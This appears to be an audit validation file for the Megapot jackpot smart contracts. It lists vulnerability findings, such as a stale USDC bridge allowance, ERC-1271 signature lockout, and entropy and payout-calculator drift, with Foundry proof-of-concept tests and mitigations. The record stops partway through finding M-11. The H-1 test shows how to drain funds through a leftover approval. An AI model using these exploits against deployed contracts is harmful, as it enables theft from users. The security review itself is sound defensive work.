# 2025-11-megapot Round 4 Canonicalization Input

Source validated run: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/validation-three-shot/runs/v2/2025-11-megapot-run-001.md`
Candidate count: `50`

This file contains only findings currently marked `Valid` with reportable severity for the configured validation profile.

## Candidates

## H-1 / `emCZQy_NnRkOsuezTEB29`
- Finding title: Arbitrary bridge call leaves reusable USDC allowance that can drain later bridge-manager funds
- Report lines: 664-785

### Original Report Block
```md
## [H-1]. Arbitrary bridge call leaves reusable USDC allowance that can drain later bridge-manager funds

## id: emCZQy_NnRkOsuezTEB29

## Derived From Pattern/Invariant
ArbitraryExternalCall

## Exploit Type
ArbitraryExternalCall

## Location
JackpotBridgeManager.claimWinnings / _bridgeFunds

## Finding Status: Valid
### Finding Status Justification: _bridgeFunds approves bridgeDetails.approveTo for claimedAmount, executes arbitrary bridgeDetails.to.call(data), and never resets the allowance. Its only postcondition is that this contract's USDC balance fell by claimedAmount. A route can make the balance decrease without consuming the allowance, leaving approveTo able to transferFrom later manager USDC. There is no allowance cleanup or spender/target allowlist.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`claimWinnings` lets any relayer execute signer-provided `RelayTxData`, and `_bridgeFunds` approves the signer-chosen `approveTo` for the full claimed amount before making an arbitrary call to signer-chosen `to` with signer-chosen calldata. The only postcondition is that this contract's USDC balance decreased by exactly `_claimedAmount`; the allowance granted to `approveTo` is never revoked. Vulnerable snippet: `if (_bridgeDetails.approveTo != address(0)) { usdc.approve(_bridgeDetails.approveTo, _claimedAmount); } ... (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data); ... if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();`. A malicious or compromised bridge route can satisfy the balance-delta check by moving exactly the current winnings out while deliberately not consuming the allowance from `JackpotBridgeManager` to `approveTo`. Because ERC20 approvals persist, the approved spender can later call `transferFrom` to steal unrelated USDC that enters the manager from future ticket purchases, overpayments caused by active-drawing ticket price mismatch, or future winnings awaiting bridging.

## Impact
The approved spender can steal future USDC held by the bridge manager up to the stale allowance amount. This can lock or redirect later users' ticket purchase funds or claimed winnings without any fresh signature from those later users.

## Proof of Concept
1. A ticket owner has claimable winnings and signs `ClaimWinningsData` with `approveTo` set to an attacker-controlled spender and `to` set to an attacker-controlled bridge adapter. 2. The adapter's call transfers exactly `claimedAmount` USDC out of `JackpotBridgeManager` by another mechanism or leaves the allowance untouched while still making the manager's balance drop by exactly `claimedAmount`. 3. `_bridgeFunds` accepts the route because `preUSDCBalance - postUSDCBalance == claimedAmount`. 4. The manager still has `usdc.allowance(manager, approveTo) == claimedAmount`. 5. Later, unrelated USDC arrives in the manager. 6. The stale `approveTo` calls `usdc.transferFrom(manager, attacker, claimedAmount)` and drains those funds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function mint(address,uint256) external;
}

contract MockUSDC is IERC20Like {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockJackpot {
    IERC20Like public usdc;
    constructor(IERC20Like _usdc) { usdc = _usdc; }
    function ticketPrice() external pure returns (uint256) { return 1e6; }
    function currentDrawingId() external pure returns (uint256) { return 1; }
    function claimWinnings(uint256[] memory) external { usdc.mint(msg.sender, 100e6); }
}

contract MockNFT {}

contract BridgeAdapter {
    IERC20Like public usdc;
    address public sink;
    constructor(IERC20Like _usdc, address _sink) { usdc = _usdc; sink = _sink; }
    function bridgeDirectly() external { usdc.transfer(sink, 100e6); }
}

contract StaleAllowancePOC is Test {
    function test_staleAllowanceDrainsLaterFunds() external {
        MockUSDC usdc = new MockUSDC();
        MockJackpot jackpot = new MockJackpot(usdc);
        MockNFT nft = new MockNFT();
        JackpotBridgeManager manager = new JackpotBridgeManager(
            IJackpot(address(jackpot)),
            IJackpotTicketNFT(address(nft)),
            IERC20(address(usdc)),
            "JackpotBridgeManager",
            "1"
        );

        address winner = vm.addr(1);
        address attacker = address(0xBEEF);
        BridgeAdapter adapter = new BridgeAdapter(usdc, attacker);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 7;
        vm.store(address(manager), keccak256(abi.encode(ids[0], uint256(1))), bytes32(uint256(uint160(winner))));

        JackpotBridgeManager.RelayTxData memory route = JackpotBridgeManager.RelayTxData({
            approveTo: attacker,
            to: address(adapter),
            data: abi.encodeWithSelector(BridgeAdapter.bridgeDirectly.selector)
        });
        bytes32 digest = manager.createClaimWinningsEIP712Hash(ids, route);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        manager.claimWinnings(ids, route, sig);
        assertEq(usdc.allowance(address(manager), attacker), 100e6);

        usdc.mint(address(manager), 100e6);
        vm.prank(attacker);
        usdc.transferFrom(address(manager), attacker, 100e6);
        assertEq(usdc.balanceOf(attacker), 200e6);
    }
}

interface IJackpot { function buyTickets(JackpotBridgeManager.RelayTxData[] memory,address,address[] memory,uint256[] memory,bytes32) external returns (uint256[] memory); function claimWinnings(uint256[] memory) external; function ticketPrice() external view returns (uint256); function currentDrawingId() external view returns (uint256); }
interface IJackpotTicketNFT {}

## Suggested Mitigation
After the bridge call, always reset any temporary approval to zero and verify the final allowance is zero. Prefer `forceApprove(approveTo, 0)` in a `finally`-style structure or use a trusted bridge adapter that pulls exactly once. Also constrain `approveTo` and `to` to an allowlist or require `approveTo == to` when approvals are needed.
```

### Current Validated Block
### H-1 / `emCZQy_NnRkOsuezTEB29`
- Finding Title: Arbitrary bridge call leaves reusable USDC allowance that can drain later bridge-manager funds
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `bridge-stale-allowance`
- Checklist Gates Passed: `Stage0, scope, supported-behavior, root-cause, safeguards, bounded-impact`
- Checklist Gates Failed: `high-impact`
- Detailed Reason: `_bridgeFunds` grants an arbitrary `approveTo` allowance, executes arbitrary signed calldata, and never clears or verifies the allowance after only checking that exactly the current claim amount left the manager. The report overstates "future winnings awaiting bridging" because normal claim and buy flows do not leave an inter-transaction balance window, but any existing or later idle bridge-manager surplus, including overcharge surplus from the live ticket-price mismatch path, can be drained up to the stale allowance. This is a real bounded asset-loss issue, not High on its own.
- Code Evidence: In `contracts/JackpotBridgeManager.sol`, `claimWinnings` receives claimed USDC then calls `_bridgeFunds`; `_bridgeFunds` calls `usdc.approve(_bridgeDetails.approveTo, _claimedAmount)`, performs `_bridgeDetails.to.call(_bridgeDetails.data)`, and checks only `preUSDCBalance - postUSDCBalance == _claimedAmount` without resetting allowance. `buyTickets` can leave surplus because it pulls `jackpot.ticketPrice()` while `Jackpot.buyTickets` charges `drawingState[currentDrawingId].ticketPrice`.

## M-2 / `rQOhmiuSK6JH_yE1hbzbl`
- Finding title: ECDSA-only bridge claims permanently lock tickets owned by ERC-1271 smart wallets
- Report lines: 786-820

### Original Report Block
```md
## [M-2]. ECDSA-only bridge claims permanently lock tickets owned by ERC-1271 smart wallets

## id: rQOhmiuSK6JH_yE1hbzbl

## Derived From Pattern/Invariant
EIP1271ByPass

## Exploit Type
StandardViolation

## Location
JackpotBridgeManager.claimTickets/claimWinnings

## Finding Status: Valid
### Finding Status Justification: buyTickets accepts any nonzero recipient and records ticketOwner[ticketId] as that address, including contracts. claimTickets and claimWinnings use ECDSA.recover and compare the recovered EOA directly to ticketOwner. There is no SignatureChecker or ERC-1271 isValidSignature path and no rejection of contract recipients. A smart-wallet owner cannot produce an ECDSA signature recovering to the wallet contract address, so the claim path is blocked.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager records any nonzero address as ticketOwner in buyTickets(), including contract wallets, but both signed claim paths only recover an EOA with ECDSA.recover and compare that EOA to ticketOwner. A valid ERC-1271 signature from a smart wallet owner/module recovers to the underlying EOA or module signer, not to the smart wallet address stored in ticketOwner, so the ownership check always reverts for smart-wallet ticket owners. Vulnerable snippet: `address signer = ECDSA.recover(eipHash, _signature); _validateTicketOwnership(_ticketIds, signer);` and `_validateTicketOwnership` requires `ticketOwner[ticketId] == _signer`. There is no SignatureChecker/EIP-1271 fallback and no alternate path for the bridge manager to release custodied NFTs or claim winnings for those tickets.

## Impact
Bridge-custodied ticket NFTs owned by ERC-1271 smart wallets, and any matured winnings/refunds attached to them, become inaccessible because neither claimTickets nor claimWinnings can be authorized by the recorded owner.

## Proof of Concept
1. A smart account buys bridge tickets or receives bridge ticket ownership by being passed as _recipient in buyTickets(). 2. ticketOwner[ticketId] is set to the smart account address while the NFT remains custodied by JackpotBridgeManager. 3. The smart account produces a valid ERC-1271 signature over createClaimTicketEIP712Hash or createClaimWinningsEIP712Hash. 4. JackpotBridgeManager calls ECDSA.recover instead of ERC-1271 validation, recovering the module/owner EOA rather than the smart account address. 5. _validateTicketOwnership reverts because ticketOwner[ticketId] is the smart wallet, permanently preventing local ticket withdrawal or winnings bridge claims.

## Proof of Code
function testSmartWalletTicketOwnerCannotClaimWith1271Signature() public { SmartWallet1271 wallet = new SmartWallet1271(owner); uint256[] memory ids = bridgeManager.buyTickets(oneTicket(), address(wallet), new address[](0), new uint256[](0), bytes32(0)); bytes32 digest = bridgeManager.createClaimTicketEIP712Hash(ids, owner); (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest); bytes memory sig = abi.encodePacked(r, s, v); assertEq(wallet.isValidSignature(digest, sig), 0x1626ba7e); vm.expectRevert(JackpotErrors.NotTicketOwner.selector); bridgeManager.claimTickets(ids, owner, sig); }

## Suggested Mitigation
Validate signatures against the recorded ticket owner with OpenZeppelin SignatureChecker.isValidSignatureNow(owner, digest, signature), which supports EOAs and ERC-1271 contract wallets. Derive the expected owner from the first ticket, require all ticketIds share that owner, then validate the signature for that owner rather than recovering a standalone EOA.
```

### Current Validated Block
### M-2 / `rQOhmiuSK6JH_yE1hbzbl`
- Finding Title: ECDSA-only bridge claims permanently lock tickets owned by ERC-1271 smart wallets
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `erc1271-unsupported`
- Checklist Gates Passed: `Stage0, scope, supported-behavior, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The bridge accepts any nonzero recipient as the recorded ticket owner, including contract wallets, but both release paths require an ECDSA recovery result to equal that recorded owner. A contract wallet cannot produce an EOA signature that recovers to the contract address, and there is no ERC-1271 `SignatureChecker` fallback or contract-recipient rejection. For bridge-custodied tickets this can lock ticket withdrawal and any later winnings/refund route for smart-wallet owners.
- Code Evidence: `contracts/JackpotBridgeManager.sol::buyTickets` records `ticketOwner[ticketId] = _recipient` after only checking `_recipient != address(0)`. `claimWinnings` and `claimTickets` call `ECDSA.recover(...)` and `_validateTicketOwnership`, which compares `ticketOwner[ticketId]` directly to the recovered signer.

## M-5 / `WoebK6L4bf9CMQmO1z0JH`
- Finding title: Changing entropy provider while a drawing is pending permanently blocks settlement
- Report lines: 895-976

### Original Report Block
```md
## [M-5]. Changing entropy provider while a drawing is pending permanently blocks settlement

## id: WoebK6L4bf9CMQmO1z0JH

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift: mutable entropy provider invalidates in-flight callback authority

## Exploit Type
Dos

## Location
Jackpot.runJackpot / setEntropy / scaledEntropyCallback

## Finding Status: Valid
### Finding Status Justification: setEntropy is documented as changing the entropy provider for future drawing executions, but because authorization is live global state it invalidates an already-requested drawing. The scope specifically treats mid-flow global parameter changes that affect active drawings as in-scope fairness/liveness risk.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`runJackpot` requests randomness from the current `entropy` provider and locks the drawing. The callback authorization later checks `msg.sender == address(entropy)` against the mutable global provider, not the provider that received the request. Vulnerable snippets: `entropy.requestAndCallbackScaledRandomness{value: fee}(...);` and `modifier onlyEntropy() { if (msg.sender != address(entropy)) revert ...; }`. If the owner rotates entropy after a request is in flight, the original provider can no longer settle the locked drawing, while the new provider has no pending request for it.

## Impact
The active drawing remains locked and cannot progress to the next drawing. Ticket purchases, LP deposits, and normal settlement are functionally DoSed until emergency mode is used, which is documented as a terminal recovery path.

## Proof of Concept
1. A drawing becomes due. 2. A keeper calls `runJackpot`, locking the drawing and sending the request to entropy provider E1. 3. Owner rotates entropy to E2 for future operation before E1 fulfills. 4. E1 attempts the callback, but `onlyEntropy` rejects it because `entropy == E2`. 5. E2 cannot fulfill E1's pending sequence. 6. The drawing remains locked and settlement cannot complete.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/Jackpot.sol";
import "../contracts/JackpotTicketNFT.sol";
import "../contracts/interfaces/IPayoutCalculator.sol";
import "../contracts/interfaces/IJackpotLPManager.sol";
import "../contracts/interfaces/IScaledEntropyProvider.sol";

contract EntropyDriftLP is IJackpotLPManager {
    function processDeposit(uint256,address,uint256) external {}
    function processInitiateWithdraw(uint256,address,uint256) external {}
    function processFinalizeWithdraw(uint256,address) external returns (uint256) { return 0; }
    function processDrawingSettlement(uint256,uint256,uint256,uint256) external returns (uint256,uint256) { return (1_000_000e6, 1e18); }
    function emergencyWithdrawLP(uint256,address) external returns (uint256) { return 0; }
    function initializeDrawingLP(uint256,uint256) external {}
    function setLPPoolCap(uint256,uint256) external {}
    function initializeLP() external {}
    function getDrawingAccumulator(uint256) external pure returns (uint256) { return 1e18; }
    function getLPDrawingState(uint256) external pure returns (LPDrawingState memory) { return LPDrawingState(1_000_000e6, 1_000_000e6, 0); }
}

contract EntropyDriftUSDC { function transfer(address,uint256) external pure returns (bool) { return true; } function transferFrom(address,address,uint256) external pure returns (bool) { return true; } }
contract EntropyDriftPayout is IPayoutCalculator { function calculateAndStoreDrawingUserWinnings(uint256,uint256,uint8,uint8,uint256[] memory,uint256[] memory) external pure returns (uint256) { return 0; } function setDrawingTierInfo(uint256) external {} function getTierPayout(uint256,uint256) external pure returns (uint256) { return 0; } }
contract EntropyProviderMock is IScaledEntropyProvider { function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64) { return 1; } function getFee(uint32) external pure returns (uint256) { return 0; } }

contract EntropyProviderDriftTest is Test {
    function test_entropyRotationRejectsOriginalCallbackAndLeavesDrawingLocked() external {
        Jackpot jackpot = new Jackpot(1, 5, 1, 1e17, 0, 0, 0, 0, 0, 1e6, 1, 200000);
        JackpotTicketNFT nft = new JackpotTicketNFT(IJackpot(address(jackpot)));
        EntropyProviderMock e1 = new EntropyProviderMock();
        EntropyProviderMock e2 = new EntropyProviderMock();
        jackpot.initialize(IERC20(address(new EntropyDriftUSDC())), IJackpotLPManager(address(new EntropyDriftLP())), IJackpotTicketNFT(address(nft)), IScaledEntropyProvider(address(e1)), IPayoutCalculator(address(new EntropyDriftPayout())));
        jackpot.initializeLPDeposits(10_000_000e6);
        jackpot.initializeJackpot(block.timestamp - 1);
        jackpot.runJackpot();
        jackpot.setEntropy(IScaledEntropyProvider(address(e2)));
        uint256[][] memory nums = new uint256[][](2);
        nums[0] = new uint256[](5); nums[0][0]=1; nums[0][1]=2; nums[0][2]=3; nums[0][3]=4; nums[0][4]=5;
        nums[1] = new uint256[](1); nums[1][0]=1;
        vm.prank(address(e1));
        vm.expectRevert();
        jackpot.scaledEntropyCallback(bytes32(0), nums, "");
        IJackpotLPManager.LPDrawingState memory unused;
        Jackpot.DrawingState memory st = jackpot.getDrawingState(jackpot.currentDrawingId());
        assertEq(st.jackpotLock, true);
    }
}

## Suggested Mitigation
Snapshot the entropy provider and request id for each in-flight drawing, e.g. `pendingEntropyProvider[drawingId] = entropy`, and authorize callbacks from that stored provider until settlement or an explicit owner-controlled abandon/retry path clears the pending request. Do not let `setEntropy` affect already-requested drawings.
```

### Current Validated Block
### M-5 / `WoebK6L4bf9CMQmO1z0JH`
- Finding Title: Changing entropy provider while a drawing is pending permanently blocks settlement
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: This is a real mid-flow global-state bug. `runJackpot` requests randomness from the then-current entropy contract, but the later callback authorization reads the live mutable `entropy` address. The docs say `setEntropy` affects future drawing executions and the benchmark explicitly calls out mid-drawing admin changes, so a routine rotation during an in-flight request can reject the valid old callback and leave the drawing locked until privileged recovery.
- Code Evidence: `contracts/Jackpot.sol::runJackpot` calls `entropy.requestAndCallbackScaledRandomness` after `_lockJackpot`. `setEntropy` updates the global `entropy` without checking `jackpotLock`, and the `onlyEntropy` modifier on `scaledEntropyCallback` compares `msg.sender` to the live `address(entropy)`.

## M-7 / `b_aiHuotWEfaTycI8agH9`
- Finding title: Changing payoutCalculator mid-drawing can settle active tickets with an unsnapshotted calculator
- Report lines: 1016-1050

### Original Report Block
```md
## [M-7]. Changing payoutCalculator mid-drawing can settle active tickets with an unsnapshotted calculator

## id: b_aiHuotWEfaTycI8agH9

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
Jackpot.setPayoutCalculator/scaledEntropyCallback

## Finding Status: Valid
### Finding Status Justification: Although setPayoutCalculator is privileged, the audit scope expressly calls out mid-drawing admin/global parameter changes affecting active or prior drawings as in scope. A valid calculator rotation intended for future drawings can zero current drawing payouts because Jackpot does not snapshot the calculator address.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
The active drawing does not snapshot the payout calculator address. `setPayoutCalculator()` updates the global pointer immediately, and settlement later calls `payoutCalculator.calculateAndStoreDrawingUserWinnings(currentDrawingId, ...)`. A valid calculator replacement during an active drawing therefore affects already sold tickets. If the new calculator has not received `setDrawingTierInfo(currentDrawingId)`, its `drawingTierInfo[currentDrawingId]` is empty and payouts can calculate to zero even though the old calculator had snapshotted tier data.

## Impact
Active drawing winners can be underpaid or receive zero payout after an otherwise valid payout-calculator rotation intended for future drawings. The unpaid value remains in LP accounting instead of going to winning ticket holders.

## Proof of Concept
1. Drawing N is initialized and the old payout calculator snapshots tier info for N. 2. Users buy tickets for drawing N. 3. Before entropy settlement, governance rotates `payoutCalculator` to a new calculator for future use. 4. Entropy callback settles drawing N using the new calculator. 5. The new calculator has no tier snapshot for drawing N, so tier payouts are zero and winners cannot receive the expected amounts.

## Proof of Code
pragma solidity ^0.8.28; import "forge-std/Test.sol"; import "../contracts/GuaranteedMinimumPayoutCalculator.sol"; import "../contracts/interfaces/IJackpot.sol"; contract PayoutPointerPoC is Test { function testNewCalculatorWithoutDrawingSnapshotZerosActivePayouts() public { bool[12] memory tiers; uint256[12] memory weights; tiers[11] = true; weights[11] = 1e18; GuaranteedMinimumPayoutCalculator oldCalc = new GuaranteedMinimumPayoutCalculator(IJackpot(address(this)), 1e6, 0, tiers, weights); GuaranteedMinimumPayoutCalculator newCalc = new GuaranteedMinimumPayoutCalculator(IJackpot(address(this)), 1e6, 0, tiers, weights); oldCalc.setDrawingTierInfo(1); uint256[] memory unique = new uint256[](12); uint256[] memory dup = new uint256[](12); unique[11] = 1; uint256 payout = newCalc.calculateAndStoreDrawingUserWinnings(1, 100e6, 5, 1, unique, dup); assertEq(payout, 0); assertGt(oldCalc.minimumPayout(), 0); } }

## Suggested Mitigation
Snapshot the payout calculator address in `DrawingState` when the drawing is created and use that stored address for settlement and claim-time tier payout lookup. Alternatively, disallow payout calculator changes while a drawing is active or require migration that initializes tier data for the current drawing before the pointer changes.
```

### Current Validated Block
### M-7 / `b_aiHuotWEfaTycI8agH9`
- Finding Title: Changing payoutCalculator mid-drawing can settle active tickets with an unsnapshotted calculator
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: A payout calculator rotation is documented as future-facing, but Jackpot stores only one global calculator pointer. If governance installs a fresh calculator during an active drawing, that calculator has not received `setDrawingTierInfo(currentDrawingId)`, so settlement can calculate using default zero tier config and store zero payouts. This is a normal privileged workflow exposing user payout loss, not merely malicious use of authority.
- Code Evidence: `contracts/Jackpot.sol::setPayoutCalculator` only assigns the global `payoutCalculator`. `_setNewDrawingState` snapshots tier info only on the calculator current at drawing initialization, while `_calculateDrawingUserWinnings` later calls the live `payoutCalculator.calculateAndStoreDrawingUserWinnings`.

## M-8 / `-QwYrwqDqTJ71r1NZS63J`
- Finding title: Changing Jackpot entropy address while a draw is pending bricks the authorized callback
- Report lines: 1051-1088

### Original Report Block
```md
## [M-8]. Changing Jackpot entropy address while a draw is pending bricks the authorized callback

## id: -QwYrwqDqTJ71r1NZS63J

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation: pending entropy callbacks are authorized against mutable entropy address

## Exploit Type
GlobalParamMidFlowManipulation

## Location
Jackpot.setEntropy/scaledEntropyCallback

## Finding Status: Valid
### Finding Status Justification: A documented future-facing entropy rotation can invalidate an in-flight callback because the callback check uses mutable global state. Given the scope's explicit focus on mid-drawing admin changes and stuck progression, this is not only governance risk.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`runJackpot` requests randomness from the current `entropy` contract and locks the drawing. The fulfillment path is later authorized by `onlyEntropy`, which compares `msg.sender` to the mutable global `entropy`: `if (msg.sender != address(entropy)) revert UnauthorizedEntropyCaller();`. If `setEntropy` is called while a request is pending, the original provider's callback is no longer authorized, while the new provider has no corresponding pending request for the locked drawing.

## Impact
A routine entropy-provider migration can leave the drawing locked and unable to settle until governance notices and restores the old entropy address or enters emergency recovery. Current tickets, LP withdrawals, and drawing progression are blocked in the meantime.

## Proof of Concept
1. Drawing d is due and `runJackpot` locks it while requesting randomness from entropy provider E1. 2. Before E1 fulfills, owner rotates `Jackpot.entropy` to E2 for future requests. 3. E1 calls back with valid randomness. 4. `scaledEntropyCallback` reverts in `onlyEntropy` because `msg.sender` is E1 but the current global entropy is E2. 5. E2 cannot fulfill the old request because it never created it, so drawing d remains locked.

## Proof of Code
pragma solidity ^0.8.28;
import {Test} from "forge-std/Test.sol";
contract EntropyAuthHarness { error UnauthorizedEntropyCaller(); address public entropy; bool public locked; constructor(address e) { entropy = e; locked = true; } function setEntropy(address e) external { entropy = e; } function scaledEntropyCallback() external { if (msg.sender != entropy) revert UnauthorizedEntropyCaller(); locked = false; } }
contract JackpotEntropyRotationPoC is Test { function testOldEntropyCallbackRejectedAfterRotation() public { address oldEntropy = address(0xE1); address newEntropy = address(0xE2); EntropyAuthHarness h = new EntropyAuthHarness(oldEntropy); h.setEntropy(newEntropy); vm.prank(oldEntropy); vm.expectRevert(EntropyAuthHarness.UnauthorizedEntropyCaller.selector); h.scaledEntropyCallback(); assertTrue(h.locked()); } }

## Suggested Mitigation
Snapshot `entropy` per pending drawing/request and authorize callbacks against that snapshot. Disallow `setEntropy` while `drawingState[currentDrawingId].jackpotLock` is true, or add an explicit cancel/abandon flow that unlocks and accounts for the pending drawing safely.
```

### Current Validated Block
### M-8 / `-QwYrwqDqTJ71r1NZS63J`
- Finding Title: Changing Jackpot entropy address while a draw is pending bricks the authorized callback
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The pending callback source is not snapshotted per drawing. A valid future-intended entropy rotation after `runJackpot` but before fulfillment makes the request-time entropy contract fail `onlyEntropy`, leaving the drawing locked. This directly violates the docs' future-effects description and the benchmark's mid-drawing admin-change concern.
- Code Evidence: `contracts/Jackpot.sol::runJackpot` requests through the current `entropy`; `setEntropy` changes that global while locked; `scaledEntropyCallback` is guarded by `onlyEntropy`, which checks `msg.sender != address(entropy)` against the live pointer.

## M-10 / `VcshH0W6i-ZnZDjOPbtST`
- Finding title: No-referral winner share is credited to the current drawing instead of the settled drawing
- Report lines: 1128-1162

### Original Report Block
```md
## [M-10]. No-referral winner share is credited to the current drawing instead of the settled drawing

## id: VcshH0W6i-ZnZDjOPbtST

## Derived From Pattern/Invariant
FeeAccountingDrift / AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.claimWinnings / _payReferrersWinnings

## Finding Status: Valid
### Finding Status Justification: _payReferrersWinnings uses drawingState[currentDrawingId].lpEarnings for no-referral claims, while claimWinnings passes only the referral scheme, winningAmount, and the settled drawing's referralWinShare. It does not pass or use the ticket drawingId. Old tickets can be claimed after currentDrawingId has advanced, so retained referral share is credited to the wrong LP cohort. The path is in in-scope Jackpot code with no safeguard. It is permissionless for a winning ticket holder.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a winning ticket has no referral scheme, the retained referral-win share should be returned to the LP accounting bucket for the drawing that produced the winnings. Instead, _payReferrersWinnings credits drawingState[currentDrawingId].lpEarnings, so the recipient LP cohort depends on when the winner claims, not on the settled drawing. Vulnerable snippet: if (_referralSchemeId == bytes32(0)) { drawingState[currentDrawingId].lpEarnings += referrerShare; emit LpEarningsUpdated(currentDrawingId, referrerShare); return referrerShare; }. Since claimWinnings can be called long after drawingId < currentDrawingId, a winner can delay claiming until they are an LP in a later drawing and redirect the retained share away from the LPs that funded the winning drawing.

## Impact
LPs from the winning drawing are underpaid while LPs in a later/current drawing receive value sourced from an older settled drawing. A winner can time claims and LP deposits to recover part of their own referral share or transfer value between LP cohorts.

## Proof of Concept
1. A user buys a no-referral ticket in drawing d. 2. The ticket wins and settlement subtracts the full winningAmount from drawing d LP value. 3. The user waits until currentDrawingId is d+1 or later and deposits as an LP in the current drawing. 4. The user claims the old ticket. 5. _payReferrersWinnings deducts referrerShare from the user payout but credits drawingState[currentDrawingId].lpEarnings instead of drawingState[d].lpEarnings. 6. The later LP cohort receives the retained share at its next settlement.

## Proof of Code
function test_noReferralShareIsCreditedToCurrentDrawing() public { uint256 winningTicketId = buyNoReferralWinningTicket(alice); settleDrawingWithTicketAsWinner(winningTicketId); uint256 settledDrawing = jackpot.currentDrawingId() - 1; advanceAndInitializeNextDrawing(); vm.prank(alice); jackpot.lpDeposit(1_000e6); uint256[] memory ids = new uint256[](1); ids[0] = winningTicketId; uint256 currentBefore = jackpot.getDrawingState(jackpot.currentDrawingId()).lpEarnings; vm.prank(alice); jackpot.claimWinnings(ids); uint256 refShare = payoutFor(winningTicketId) * jackpot.getDrawingState(settledDrawing).referralWinShare / 1e18; assertEq(jackpot.getDrawingState(jackpot.currentDrawingId()).lpEarnings, currentBefore + refShare); assertEq(jackpot.getDrawingState(settledDrawing).lpEarnings, 0); }

## Suggested Mitigation
Pass the ticket's drawingId into _payReferrersWinnings and credit drawingState[drawingId].lpEarnings for no-referral claims. Avoid reading currentDrawingId for historical claim accounting.
```

### Current Validated Block
### M-10 / `VcshH0W6i-ZnZDjOPbtST`
- Finding Title: No-referral winner share is credited to the current drawing instead of the settled drawing
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `referral-share-wrong-epoch`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Claiming a completed no-referral winning ticket after `currentDrawingId` has advanced credits the retained referral-win-share to the active drawing's LP earnings, not the drawing that funded the payout. Since settlement already charged the completed drawing for the full tier payout, delayed claimers can redirect material value between LP cohorts. The path is permissionless for any winning ticket holder.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` obtains `ticketInfo.drawingId` and the settled drawing state, but `_payReferrersWinnings` receives no drawing ID. In `_payReferrersWinnings`, the no-referral branch writes `drawingState[currentDrawingId].lpEarnings += referrerShare`.

## M-11 / `PPrrZKotDc61i9N4tnTCl`
- Finding title: Changing entropy while a drawing is pending bricks the original callback and leaves the jackpot locked
- Report lines: 1163-1197

### Original Report Block
```md
## [M-11]. Changing entropy while a drawing is pending bricks the original callback and leaves the jackpot locked

## id: PPrrZKotDc61i9N4tnTCl

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift: mutable entropy authority during pending request

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
Jackpot.scaledEntropyCallback / setEntropy

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`runJackpot` requests randomness from the current entropy provider and locks the drawing, but the callback authorization checks `msg.sender == address(entropy)` against the mutable global entropy address. If governance changes entropy after the request is made and before fulfillment, the original provider is no longer authorized to settle the locked drawing. The new provider has no matching pending request for that drawing.

## Impact
The current drawing remains locked and cannot progress through the normal settlement path. Ticket purchases, LP deposits, and withdrawals depending on drawing progression are blocked until governance manually restores the old provider or enters emergency recovery.

## Proof of Concept
